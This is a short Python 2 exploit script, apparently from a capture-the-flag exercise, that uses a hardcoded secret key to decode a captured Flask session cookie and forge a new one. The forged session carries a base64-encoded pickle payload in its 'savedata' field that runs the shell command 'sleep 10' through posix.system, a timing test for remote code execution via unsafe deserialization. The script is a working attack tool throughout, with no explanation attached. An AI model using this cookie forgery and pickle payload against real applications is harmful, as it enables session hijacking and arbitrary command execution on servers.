#!/usr/bin/env python
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	# Override method
	# Take secret_key instead of an instance of a Flask app
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)

sk = '\\\xe4\xed}w\xfd3\xdc\x1f\xd72\x07/C\xa9I'
#sessionDict = {'Hello':'World'}
cookie = ".eJwdjc0KgkAURl8l5gkUo4XgxphrTaTMdX7y7pQRRM0ExYXiu5ctz-F8fBubyqV25VyycGOnioWMPMgoSVG2fau1WYwHKDXE8j2TBTEVPjysNsHhkPeBsmPsuM_VC1NM3KAMDmnnX4qVMoTxLBUMeOw1dOgXHvEG0LhY_Z34FKvIay4seXQ0MXE3PRNxM0NzrRIH_2-LPx67nJs7gQMno4jt-xekLD0A.XmU7eg.xZBHcABhzdiGudaeTQbtABXDMBI"
decodedDict = decodeFlaskCookie(sk, cookie)
print "[+] decoded cookie: "
print decodedDict


sessionDict = {u'savedata': 'Y3Bvc2l4CnN5c3RlbQpwMQooUydzbGVlcCAxMCcKcDIKdFJwMwou'}
new_cookie = encodeFlaskCookie(sk, sessionDict)
print "\n[+] new_cookie: "
print new_cookie
